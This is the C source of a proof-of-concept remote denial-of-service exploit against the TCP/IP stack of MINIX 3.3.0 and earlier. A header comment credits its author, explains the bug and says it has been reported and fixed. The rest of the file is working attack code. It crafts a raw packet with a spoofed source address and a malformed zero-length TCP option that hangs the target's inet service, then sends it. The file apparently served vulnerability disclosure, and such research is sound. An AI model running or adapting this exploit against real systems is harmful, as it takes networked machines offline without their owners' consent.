/*
  _-------------------------------------------------------_
 ||------+  MINIX <= 3.3.0 Remote TCP/IP Stack DoS +------||
 ||_______________________________________________________||
 ||--=[ Alejandro Hernandez < nitr0us >               ]=--||
 ||--=[ Nov 2014                                      ]=--||
 ||--=[ Mexico                                        ]=--||
  -_______________________________________________________-
_____________________________________________________________________________________

 MINIX IS PRONE TO DENIAL OF SERVICE IN THE TCP/IP STACK (/service/inet) BY SENDING 
 A SINGLE TCP PACKET WITH A MALFORMED TCP OPTION. A TCP OPTION WITH LENGTH OF ZERO
 WOULD CAUSE inet TO END UP IN AN INFINITE LOOP.

 BECAUSE OF MINIX'S MICROKERNEL NATURE, THE NETWORKING SERVICE RUNS IN USERLAND AND 
 THEREFORE, THE MOST CRITICAL PARTS OF THE RUNNING KERNEL ARE UNAFFECTED.

 THIS ISSUE HAS BEEN REPORTED AND ALREADY FIXED:
 https://github.com/Stichting-MINIX-Research-Foundation/minix/issues/7
_____________________________________________________________________________________

 MINIX 3
 http://minix3.org

 Microkernel (Slide 26)
 http://www.eecs.harvard.edu/~mdw/course/cs161/notes/osstructure.pdf

 TCP Option Kind Numbers
 http://www.iana.org/assignments/tcp-parameters/tcp-parameters.xhtml#tcp-parameters-1
_____________________________________________________________________________________

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#define __FAVOR_BSD 1    /* Use BSD's tcp header style */
#include <netinet/tcp.h>

#define IPSIZE	sizeof(struct ip)
#define TCPSIZE	sizeof(struct tcphdr)

#define DEFAULT_SRC_IP	"1.3.3.7"

uint16_t _checksum(uint16_t * addr, int len) {
	int nleft = len;
	int sum = 0;

	uint16_t *w = addr;
	uint16_t answer = 0;

	while(nleft > 1){
		sum += *w++;
		nleft -= sizeof(uint16_t);
	}

	if(nleft == 1){
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum    =  (sum >> 16) + (sum & 0xffff);
	sum    += (sum >> 16);
	answer =  ~sum;

	return (answer);
}

int main(int argc, char **argv)
{
	char *packet= (char *) malloc(IPSIZE + TCPSIZE + 4);
	char *srcip = DEFAULT_SRC_IP;
	int sockfd, count;
	int pseudo_hdr_size = 12 + TCPSIZE + 4; // 12 bytes for the pseudo-header; 4 bytes for the payload
	int one = 1; /* setsockopt() */
	struct sockaddr_in target;
	struct hostent *host2ip;
	struct ip *IP = (struct ip *) packet;
	struct tcphdr *TCP = (struct tcphdr *) (packet + IPSIZE);
	unsigned char pseudo_hdr_for_checksum[pseudo_hdr_size];

	if(argc < 2){
		printf("  _-------------------------------------------------------_\n");
		printf(" ||------+  MINIX <= 3.3.0 Remote TCP/IP Stack DoS +------||\n");
		printf("  -_______________________________________________________-\n\n");
		printf("Usage: %s <IP>\n", argv[0]);

		exit(-1);
	}

	if((host2ip = gethostbyname(argv[1])) == NULL){
		perror("gethostbyname");
		exit(-1);
	}

	if(getuid() != 0){
		fprintf(stderr, "You must be root to create raw sockets.\n");
		exit(-1);
	}

	memset(packet, 0x00, sizeof(packet));
	memset(&target, 0x00, sizeof(target));

	target.sin_family	= AF_INET;
	target.sin_port		= htons(31337);
	target.sin_addr		= *((struct in_addr *)host2ip->h_addr);

	/*** SEMI-VALID TCP/IP PACKET ***/
	IP->ip_src.s_addr = inet_addr(srcip);
	IP->ip_dst.s_addr = target.sin_addr.s_addr;
	IP->ip_hl	= 0x05;
	IP->ip_v	= 0x04;
	IP->ip_tos	= 0x00;
	IP->ip_len	= htons(IPSIZE + TCPSIZE + 4);
	IP->ip_id	= 0x01;
	IP->ip_ttl	= 0xff;
	IP->ip_p	= IPPROTO_TCP;
	IP->ip_sum	= _checksum((uint16_t *) IP, IPSIZE);

	TCP->th_sport	= htons(0xcafe);
	TCP->th_dport	= htons(31337);
	TCP->th_seq	= htonl(rand());
	TCP->th_ack	= htonl(rand());
	TCP->th_off	= ((TCPSIZE + 4) / 4);
	TCP->th_win	= htons(0x1337);
	TCP->th_flags	= rand() & 0x0f;
	TCP->th_sum	= 0x00;

	/* Malformed TCP Options
	Initially tested with "\x03\x00\x00\x00" but realized that MINIX 3 hangs even with 2, 3, 4, 5, 
	6, 7, 8, 0x7f, 0xff, in the first byte. Then, I found out that if the option size (the 2nd byte) 
	is higher than zero, the stack doesn't hang. For this PoC, "\xff\x00\x00\x00" is used: */
	memcpy(packet + IPSIZE + TCPSIZE, "\xff\x00\x00\x00", 4);

	// TCP Checksum Calculation and the TCP "Pseudo Header" 
	// http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
	memset(pseudo_hdr_for_checksum, 0x00, pseudo_hdr_size);
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  0)) = IP->ip_src.s_addr;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  4)) = IP->ip_dst.s_addr;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  8)) = 0x00;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  9)) = IPPROTO_TCP;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum + 10)) = htons(TCPSIZE + 4);
	memcpy(pseudo_hdr_for_checksum + 12, ((unsigned char *) packet) + IPSIZE, TCPSIZE + 4);

	TCP->th_sum	= _checksum((uint16_t *) &pseudo_hdr_for_checksum, pseudo_hdr_size);

	printf("-=[ Computed IP header checksum:  IP->ip_sum  = 0x%x\n", IP->ip_sum);
	printf("-=[ Computed TCP header checksum: TCP->th_sum = 0x%x\n\n", TCP->th_sum);
	printf("-=[ Sending malformed TCP/IP packet...\n\n");

	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
		perror("socket");
		exit(-1);
	}

	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1){
		perror("setsockopt");
		exit(-1);
	}

	if((count = sendto(sockfd, packet, IPSIZE + TCPSIZE + 4, 0, (struct sockaddr *) &target, sizeof(target))) == -1){
		perror("sendto");
		close(sockfd);
		exit(-1);
	}

	close(sockfd);

	printf("-=[ Sent %d bytes to %s:31337\n", count, argv[1]);
	printf("-=[ TCP/IP stack should be hanged now\n");
	printf("-=[ Try to ping %s... \n", argv[1]);

	return 0;
}
